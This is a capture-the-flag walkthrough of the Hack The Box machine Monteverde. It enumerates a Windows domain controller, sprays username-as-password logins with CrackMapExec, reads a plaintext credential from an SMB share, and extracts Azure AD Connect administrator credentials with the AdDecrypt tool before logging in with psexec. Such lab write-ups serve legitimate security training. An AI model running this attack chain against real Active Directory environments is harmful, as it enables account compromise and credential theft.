# HTB - Monteverde

#### Ip: 10.10.10.172
#### Name: Monteverde
#### Rating: Medium

----------------------------------------------------------------------

Monteverde.png

### Enumeration

I'll kick off enumerating this box with an Nmap scan covering all TCP ports. To speed this along I'll also user the `--min-rate 10000` flag:

```text
┌──(ryan㉿kali)-[~/HTB/Monteverde]
└─$ sudo nmap -p-  --min-rate 10000 10.10.10.172                                        
[sudo] password for ryan: 
Starting Nmap 7.93 ( https://nmap.org ) at 2023-08-14 09:10 CDT
Nmap scan report for 10.10.10.172
Host is up (0.068s latency).
Not shown: 65517 filtered tcp ports (no-response)
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
49667/tcp open  unknown
49673/tcp open  unknown
49674/tcp open  unknown
49676/tcp open  unknown
49697/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 13.41 seconds
```

Lets scan these ports using the `-sV` and `-sC` flags to enumerate versions and to use default Nmap scripts:

```text
┌──(ryan㉿kali)-[~/HTB/Monteverde]
└─$ sudo nmap -sC -sV 10.10.10.172 -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49667 
Starting Nmap 7.93 ( https://nmap.org ) at 2023-08-14 09:11 CDT
Nmap scan report for 10.10.10.172
Host is up (0.068s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-08-14 14:11:34Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: MONTEVERDE; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2023-08-14T14:12:24
|_  start_date: N/A
| smb2-security-mode: 
|   311: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 97.36 seconds
```

Looks like we've got a domain controller here. Lets go ahead and add MEGABANK.LOCAL to `/etc/hosts`

With that done lets run enum4linux against the target in hopes we can drop some user names:

```text
┌──(ryan㉿kali)-[~/HTB/Monteverde]
└─$ enum4linux -a MEGABANK.LOCAL
```
users.png

Cool! Looks like we have some user names. Lets copy these to a file called users.txt:

Guest
AAD_987d7f2f57d2
mhope
SABatchJobs
svc-ata
svc-bexec
svc-netapp
dgalanos
roleary
smorgan

After using this username list with a couple of password lists and coming up with nothing, I tried using CrackMapExec with the user.txt file in both the username and password fields and found a match:

```text
┌──(ryan㉿kali)-[~/HTB/Monteverde]
└─$ crackmapexec smb 10.10.10.172 -u users.txt -p users.txt | grep '[+]'
SMB         10.10.10.172    445    MONTEVERDE       [+] MEGABANK.LOCAL\SABatchJobs:SABatchJobs
```

Cool, we have some credentials now. Lets use these to see if we can access any shares:

cme.png

Looks like we have read access to quitte a few of them.

### Exploitation

Going into mhope's directory in the users$ share, we find a file called azure.xml.

```text
┌──(ryan㉿kali)-[~/HTB/Monteverde]
└─$ smbclient \\\\10.10.10.172\\users$ -U SABatchJobs               
Password for [WORKGROUP\SABatchJobs]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Fri Jan  3 07:12:48 2020
  ..                                  D        0  Fri Jan  3 07:12:48 2020
  dgalanos                            D        0  Fri Jan  3 07:12:30 2020
  mhope                               D        0  Fri Jan  3 07:41:18 2020
  roleary                             D        0  Fri Jan  3 07:10:30 2020
  smorgan                             D        0  Fri Jan  3 07:10:24 2020

		31999 blocks of size 4096. 28979 blocks available
smb: \> cd mhope
smb: \mhope\> ls
  .                                   D        0  Fri Jan  3 07:41:18 2020
  ..                                  D        0  Fri Jan  3 07:41:18 2020
  azure.xml                          AR     1212  Fri Jan  3 07:40:23 2020

		31999 blocks of size 4096. 28979 blocks available
smb: \mhope\> get azure.xml 
getting file \mhope\azure.xml of size 1212 as azure.xml (4.2 KiloBytes/sec) (average 4.2 KiloBytes/sec)
```

And inside the file we find a plaintext credential:

pw.png

We can use mhope's credentials to login to the box via Evil-WinRM and grab the user.txt flag:

user_flag.png

### Privilege Escalation

Looking around the machine, I can run `whoami /groups` and see that mhope is in the Azure Admins group:

azure_admins.png

And looking in `Program Files` I find a few interesting Azure directories:

```text
    Directory: C:\Program Files


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----         1/2/2020   9:36 PM                Common Files
d-----         1/2/2020   2:46 PM                internet explorer
d-----         1/2/2020   2:38 PM                Microsoft Analysis Services
d-----         1/2/2020   2:51 PM                Microsoft Azure Active Directory Connect
d-----         1/2/2020   3:37 PM                Microsoft Azure Active Directory Connect Upgrader
d-----         1/2/2020   3:02 PM                Microsoft Azure AD Connect Health Sync Agent
d-----         1/2/2020   2:53 PM                Microsoft Azure AD Sync
d-----         1/2/2020   2:38 PM                Microsoft SQL Server

<snip>
```

After doing a bit of Googling I found this article: https://vbscrub.com/2020/01/14/azure-ad-connect-database-exploit-priv-esc/ which explains a privilege escalation vector we can use. 

From the article:

```text
The Azure AD Connect service is essentially responsible for synchronizing things between your local AD domain, and the Azure based domain. However, to do this it needs privileged credentials for your local domain so that it can perform various operations such as syncing passwords etc. <snip>

TL;DR: Its possible to just run some simple .NET or Powershell code on the server where Azure AD Connect is installed and instantly get plain text credentials for whatever AD account it is set to use! 
```

Lets go ahead and grab the scripts at https://github.com/VbScrub/AdSyncDecrypt

We can then make a `TEMP` folder and upload the executable and the accompanying .dll:

```text
*Evil-WinRM* PS C:\> mkdir TEMP


    Directory: C:\


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        8/14/2023   8:06 AM                TEMP


*Evil-WinRM* PS C:\> cd TEMP
*Evil-WinRM* PS C:\TEMP> upload ~/HTB/Monteverde/AdDecrypt.exe
Info: Uploading ~/HTB/Monteverde/AdDecrypt.exe to C:\TEMP\AdDecrypt.exe

                                                             
Data: 19796 bytes of 19796 bytes copied

Info: Upload successful!

*Evil-WinRM* PS C:\TEMP> upload ~/HTB/Monteverde/mcrypt.dll
Info: Uploading ~/HTB/Monteverde/mcrypt.dll to C:\TEMP\mcrypt.dll

                                                             
Data: 445664 bytes of 445664 bytes copied

Info: Upload successful!
```

Per the GitHub we'll need to be in the `C:\Program Files\Microsoft Azure AD Sync\Bin` directory on the target. And from there all we need to run is:

```text
*Evil-WinRM* PS C:\Program Files\Microsoft Azure AD Sync\Bin> C:\TEMP\AdDecrypt.exe -FullSQL
```

And the script will decrypt the stored credentials for the administrator:

creds.png

We can now use impacket-psexec to login to the box as the administrator:

psexec.png

And grab the final flag:

root_flag.png

Thanks for following along!

-Ryan

-----------------------------------------------
